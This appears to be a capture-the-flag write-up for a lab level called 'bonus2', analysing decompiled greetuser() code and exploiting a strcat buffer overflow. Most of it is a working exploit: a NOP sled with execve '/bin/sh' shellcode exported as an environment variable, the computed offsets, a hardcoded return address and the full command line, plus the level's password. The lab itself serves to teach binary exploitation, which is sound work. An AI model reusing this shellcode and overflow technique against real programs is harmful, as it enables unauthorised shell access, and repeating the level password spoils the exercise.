# Bonus 2
*password : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245*

```
$ scp -P 4242 bonus2@192.168.56.108:bonus2 binary/
```

## Analyze

in greetuser() :
```
  if (language == 1) {
    local_4c = 0xc3767948;
    ...
  }
  else {
    if (language == 2) {
      local_4c = 0x64656f47;
      ...
    }
    else {
      if (language == 0) {
        local_4c = 0x6c6c6548;
        ...
      }
    }
  }
strcat(&local_4c,&stack0x00000004);
puts(&local_4c);
...
```

```
$ ./bonus2 test ok
Hello test
```

conclusion :
- language = 0
- local_4c = "Hello "
- &stack0x00000004 = av[1]

## Buffer overflow : strcat exploit

- find the correct length of the first parameter to overwrite all '/0' until the second parameter => `40`
- use the second parameter to launch the shellcode
    - find the offset => `26`
    - get the shellcode address => `0xbffff832`
```
$ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
$ /tmp/a.out
0xbffff832
$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 26 + "\x32\xf8\xff\xbf"')
```
